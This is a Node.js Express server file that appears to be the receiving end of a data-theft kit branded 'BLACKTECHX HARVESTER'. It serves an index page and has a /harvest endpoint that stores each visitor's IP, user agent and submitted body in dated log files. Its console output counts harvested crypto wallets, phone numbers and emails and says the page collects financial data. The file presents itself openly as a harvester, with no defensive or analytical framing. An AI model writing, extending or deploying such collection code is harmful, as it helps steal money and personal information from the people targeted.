                                                                                                                     
  const express = require('express');                                                                                 
  const fs = require('fs');                                                                                           
  const path = require('path');                                                                                       
  const cors = require('cors');                                                                                       
                                                                                                                      
  const app = express();                                                                                              
  const PORT = process.env.PORT || 3000;                                                                              
                                                                                                                      
  // Enable CORS for all requests                                                                                     
  app.use(cors());                                                                                                    
                                                                                                                      
  // Serve static files from the current directory                                                                    
  app.use(express.static(__dirname));                                                                                 
                                                                                                                      
  // Middleware to parse JSON bodies                                                                                  
  app.use(express.json());                                                                                            
                                                                                                                      
  // Log all requests                                                                                                 
  app.use((req, res, next) => {                                                                                       
      const timestamp = new Date().toISOString();                                                                     
      const logEntry = `[${timestamp}] ${req.method} ${req.ip} ${req.originalUrl}`;                                   
      console.log(logEntry);                                                                                          
      fs.appendFileSync('access.log', logEntry + '\n');                                                               
      next();                                                                                                         
  });                                                                                                                 
                                                                                                                      
  // Serve the main index.html file                                                                                   
  app.get('/', (req, res) => {                                                                                        
      res.sendFile(path.join(__dirname, 'index.html'));                                                               
  });                                                                                                                 
                                                                                                                      
  // Endpoint to receive harvested data from the client                                                               
  app.post('/harvest', (req, res) => {                                                                                
      const timestamp = new Date().toISOString();                                                                     
      const clientIP = req.ip;                                                                                        
      const userAgent = req.get('User-Agent') || 'Unknown';                                                           
                                                                                                                      
      // Log the data collection event                                                                                
      const logData = {                                                                                               
          timestamp,                                                                                                  
          clientIP,                                                                                                   
          userAgent,                                                                                                  
          data: req.body                                                                                              
      };                                                                                                              
                                                                                                                      
      // Save to a log file                                                                                           
      const logFile = `harvest_${new Date().toISOString().split('T')[0]}.log`;                                        
      fs.appendFileSync(logFile, JSON.stringify(logData, null, 2) + '\n\n');                                          
                                                                                                                      
      console.log(`[HARVEST] Data collected from ${clientIP} at ${timestamp}`);                                       
      console.log(`[HARVEST] Crypto wallets: ${req.body.cryptoWallets?.length || 0}`);                                
      console.log(`[HARVEST] Phone numbers: ${req.body.personalInfo?.phones?.length || 0}`);                          
      console.log(`[HARVEST] Emails: ${req.body.personalInfo?.emails?.length || 0}`);                                 
                                                                                                                      
      res.json({ success: true, message: 'Data received and logged' });                                               
  });                                                                                                                 
                                                                                                                      
  // Start the server                                                                                                 
  app.listen(PORT, () => {                                                                                            
      console.log(`[SERVER] BLACKTECHX HARVESTER SERVER RUNNING ON PORT ${PORT}`);                                    
      console.log(`[SERVER] Serving index.html to collect financial data`);                                           
      console.log(`[WARNING] This server logs all harvested data to local files`);                                    
  });                                                                                                                 
                                                                                                                      
  // Graceful shutdown                                                                                                
  process.on('SIGINT', () => {                                                                                        
      console.log('\n[SERVER] Shutting down gracefully...');                                                          
      process.exit(0);                                                                                                
  });                                                                                                                 
                